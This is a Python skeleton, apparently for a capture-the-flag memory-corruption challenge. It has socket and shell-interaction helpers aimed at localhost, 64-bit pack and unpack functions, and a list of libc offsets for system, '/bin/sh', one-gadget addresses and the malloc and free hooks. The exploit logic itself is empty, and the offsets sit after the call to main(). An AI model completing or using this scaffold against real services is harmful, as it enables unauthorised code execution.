import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def main():
    
    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("localhost", 10001)
        main()
    else:
        s, f = sock("localhost", 10001)
        main()
        libc_start_offset = 0x0000000000021e50
        system_offset = 0x0000000000046590
        binsh_offset = 0x180543
        one_rce_offset = 0x4647c
        one_rce_offset = 0xe9415
        #one_rce_offset = 0xea36d
        fread_offset = 0x000000000006e7e0
        stderr_offset = 0x00000000003c31c0
        stdout_offset = 0x00000000003c3400
        stdin_offset = 0x00000000003c3640
        free_hook_offset = 0x00000000003c4a10
        malloc_hook_offset = 0x00000000003c2740
        io_list_all_offset = 0x00000000003c31a0
